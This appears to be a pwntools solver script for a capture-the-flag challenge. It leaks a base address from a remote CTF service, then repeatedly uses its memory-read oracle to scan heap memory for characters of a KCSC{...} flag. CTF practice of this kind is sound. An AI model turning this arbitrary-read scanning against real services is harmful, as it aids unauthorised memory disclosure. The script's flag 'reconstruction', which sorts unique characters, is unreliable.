from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
base = int(m.group(1), 16)
print(f'Dict base: {hex(base)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== COMPREHENSIVE FLAG CHARACTER HUNT ===")

reads_used = 0
max_reads = 48  # Use almost all our reads
all_flag_chars = {}  # addr -> char mapping
potential_flag_chars = set()

# Strategy: Scan much more memory around the heap region
heap_region_base = base & ~0xffffff  # Round to 16MB boundary
print(f"Scanning heap region starting from {heap_region_base:#x}")

# Multiple scan passes with different step sizes
scan_configs = [
    # (start_offset, end_offset, step)
    (-0x10000, 0x20000, 0x8),      # Dense scan around dict (8-byte steps)
    (-0x50000, 0x50000, 0x20),     # Medium scan (32-byte steps)  
    (-0x100000, 0x100000, 0x100),  # Wide scan (256-byte steps)
]

for start_off, end_off, step in scan_configs:
    if reads_used >= max_reads - 5:
        break
        
    print(f"\nScan pass: offset {start_off:#x} to {end_off:#x}, step {step}")
    scan_start = base + start_off
    scan_end = base + end_off
    
    for addr in range(scan_start, scan_end, step):
        if reads_used >= max_reads - 3:
            break
            
        if addr <= 0x1000:  # Skip very low addresses
            continue
            
        data = read_memory(addr)
        reads_used += 1
        
        if data:
            # Look for flag-relevant characters
            found_chars = []
            
            for i, b in enumerate(data):
                if 32 <= b <= 126:  # Printable ASCII
                    char = chr(b)
                    char_addr = addr + i
                    
                    # Focus on characters that are likely in flags
                    if (char.isalnum() or char in '{}_.,-!@#$%^&*()[]|\\:;"<>?/~`'):
                        found_chars.append((i, char))
                        potential_flag_chars.add(char)
                        all_flag_chars[char_addr] = char
            
            # Report interesting findings
            if found_chars:
                char_str = ','.join(f"{i}:{c}" for i, c in found_chars)
                
                # Highlight especially interesting patterns
                chars_only = [c for _, c in found_chars]
                text = ''.join(chars_only)
                
                # Check for flag indicators
                flag_indicators = ['K', 'C', 'S', '{', '}', 'flag', 'FLAG']
                has_flag_pattern = any(ind in text for ind in flag_indicators)
                
                if has_flag_pattern or len(found_chars) == 1:
                    marker = "*** FLAG ***" if has_flag_pattern else "* CHAR *"
                    print(f'{addr:#x}: [{char_str}] "{text}" {marker}')
                elif len(text) <= 8:  # Short strings might be relevant
                    print(f'{addr:#x}: [{char_str}] "{text}"')

print(f"\n=== FINAL RESULTS (used {reads_used}/{max_reads} reads) ===")

print(f"Total unique characters found: {len(potential_flag_chars)}")
print(f"Characters: {sorted(potential_flag_chars)}")

print(f"\nAll character locations ({len(all_flag_chars)} total):")
for addr in sorted(all_flag_chars.keys()):
    char = all_flag_chars[addr]
    print(f"  {addr:#x}: '{char}'")

# Look for common flag patterns
flag_chars = ['K', 'C', 'S', 'C', '{', '}']
found_flag_chars = [c for c in flag_chars if c in potential_flag_chars]
print(f"\nFlag structure characters found: {found_flag_chars}")

if 'K' in potential_flag_chars and 'C' in potential_flag_chars and 'S' in potential_flag_chars:
    print("*** FOUND K, C, S - This is likely a KCSC{...} flag! ***")

if '{' in potential_flag_chars and '}' in potential_flag_chars:
    print("*** FOUND { and } - Flag delimiters present! ***")

# Try to construct possible flag combinations
if len(potential_flag_chars) >= 10:  # Reasonable flag length
    print(f"\nPossible flag reconstruction needed from these {len(potential_flag_chars)} characters:")
    print(''.join(sorted(potential_flag_chars)))
    
    # Common flag patterns to look for
    common_starts = ['KCSC{', 'CTF{', 'FLAG{']
    for start in common_starts:
        if all(c in potential_flag_chars for c in start):
            remaining = potential_flag_chars - set(start)
            print(f"Possible flag: {start}{''.join(sorted(remaining))}")

io.close()